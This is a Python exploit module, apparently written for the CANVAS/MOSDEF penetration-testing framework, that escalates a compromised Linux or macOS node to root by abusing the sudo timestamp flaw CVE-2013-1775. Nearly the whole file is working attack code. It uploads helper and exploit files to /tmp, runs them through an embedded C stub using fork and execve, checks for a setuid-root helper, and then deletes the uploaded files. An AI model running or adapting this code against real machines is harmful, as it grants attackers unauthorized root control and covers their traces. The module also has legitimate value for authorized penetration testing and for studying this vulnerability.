#!/usr/bin/env python

import sys
import time

from exploitutils import *
from canvaserror import *

from ExploitTypes.localexploit import LocalExploit
from linuxNode import linuxNode
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'sudo_timestamp: Linux/MacOS timestamp privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Intel, GNU/Linux, Apple'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2013-1775'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1775'
DOCUMENTATION['References']    = 'http://www.sudo.ws/sudo/alerts/epoch_ticket.html'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux', 'MacOSX']]

DOCUMENTATION['Notes']         = """
This exploit runs on GNU/Linux and MacOS X.

On both systems this exploit requires:
- User has run at least once "sudo"
- User is an admin

On GNU/Linux it also requires that the user is currently logged in
on a wm session and has an open terminal with a bound sudo timestamp
ticket (an open pts/ on which the user has run sudo at least once).
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name      = NAME
        self.node      = None
        self.linux_lh  = 'exploits/sudo_timestamp/Resources/h_linux'
        self.linux_lx  = 'exploits/sudo_timestamp/Resources/x_linux'
        self.mac_lh_32 = 'exploits/sudo_timestamp/Resources/h_mac_32'
        self.mac_lh_64 = 'exploits/sudo_timestamp/Resources/h_mac_64'
        self.mac_lx    = 'exploits/sudo_timestamp/Resources/x_mac.py'
        self.dh        = '/tmp/h' # remote path helper
        self.dx        = '/tmp/x' # remote path exploit

    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename = dst)
        except NodeCommandError, i:
            self.log('[x] failed to upload %s to %s: %s' % (src, dst, str(i)))
            return False

        self.log('[+] upload succeeded ...')
        return True

    def statFile(self, path):
        O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
        fd = self.node.shell.open(path, O_RDONLY, 0755)
        if fd < 0:
            self.log('[x] could not open %s ...' % path)
            return {}
        ret,stat = self.node.shell.fstat(fd)
        self.node.shell.close(fd)
        if ret == 0:
            self.log('[+] st_mode: %x' % stat['st_mode'])
            self.log('[+] st_uid: %x' % stat['st_uid'])
            return stat
        else:
            self.log('[x] fstat failed ...')
            return {}

    def cleanup(self):
        self.log('[+] Cleaning up: delete %s and %s' % (self.dh, self.dx))
        self.node.runcommand('rm -rf %s %s' % (self.dx, self.dh))

    def execveHelper(self, run_exploit=0):
        lvars = {}
        lvars['HELPER']  = self.dh
        lvars['MOSDEF']  = '%d' % self.node.shell.fd
        lvars['X_CMD']   = self.dx
        lvars['EXPLOIT'] = run_exploit

        imp_statement = """ #import "%s", "sleep" as "sleep" """ % ("remote64" if hasattr(self.node.shell, "LP64") and self.node.shell.LP64 else "remote")
        sleep         = "sleep(3);"

        code = """
        #import "string", "HELPER" as "HELPER"
        #import "string", "MOSDEF" as "MOSDEF"
        #import "string", "X_CMD" as "X_CMD"

        #import "int", "EXPLOIT" as "EXPLOIT"

        #import "%s", "execl" as "execl"
        %s
        #import "local", "execve" as "execve"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            int pid;
            char *argv[3];
            argv[0] = HELPER;
            argv[1] = MOSDEF;
            argv[2] = NULL;

            char *x_cmd;
            x_cmd = X_CMD;

            if (EXPLOIT == 1) {
                pid = fork();

                if (pid == 0) {
                    execl("/bin/sh", "sh", "-c", x_cmd, NULL);
                    exit(-1);
                }

                waitpid(pid, 0, 0);
            }

            %s
            pid = fork();

            if (pid == 0) {
                execve(argv[0], argv, NULL);
                exit(-1);
            }

            sendint(0);
            waitpid(pid, 0, 0);
        }
        """ % ("remote64" if hasattr(self.node.shell, "LP64") and self.node.shell.LP64 else "remote",
               imp_statement if isinstance(self.node, osxNode) else "",
               sleep if isinstance(self.node, osxNode) else "")

        ret = self.node.shell.runCode(code, lvars)
        self.log('[+] execve helper ret: %d ...' % ret)
        return ret

    def run(self):
        self.node = self.argsDict['passednodes'][0]

        if not isinstance(self.node, (linuxNode, osxNode)):
            self.log('Node of type %s is not supported for this exploit.' % self.node.nodetype)
            return 0

        if isinstance(self.node, linuxNode):
            if self.node.proctype != 'i386':
                self.log('Node of type %s proctype %s is not supported.' % (self.node.nodetype, self.node.proctype))
                return 0

            self.log('[+] Running on an x86 Linux node ...')
            lh = self.linux_lh
            lx = self.linux_lx

        elif isinstance(self.node, osxNode):
            lx = self.mac_lx

            if hasattr(self.node.shell, "LP64") and self.node.shell.LP64:
                self.log('[+] Running on an x64 OSX node ...')
                lh = self.mac_lh_64
            else:
                self.log('[+] Running on an x86 OSX node ...')
                lh = self.mac_lh_32

        stat = self.statFile(self.dh)

        if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
            self.log('[+] already compromised ... initing elevated MOSDEF loop')
            self.execveHelper()
            return 1

        self.log('[+] uploading helper and exploit ...')

        if not self.nodeUpload(lx, self.dx): return 0
        if not self.nodeUpload(lh, self.dh): return 0

        self.log('[+] running exploit ...')

        self.execveHelper(run_exploit=1)

        for i in range(20):
            self.log('[+] Checking helper mode ...')

            stat = self.statFile(self.dh)
            if stat != {} and (stat['st_uid'] == 0 and stat['st_mode'] & 04000):
                self.log('[+] Compromised')
                self.cleanup()
                return 1

            time.sleep(1)

        self.log('[+] Looks like we failed, try again!')
        self.cleanup()
        return 0
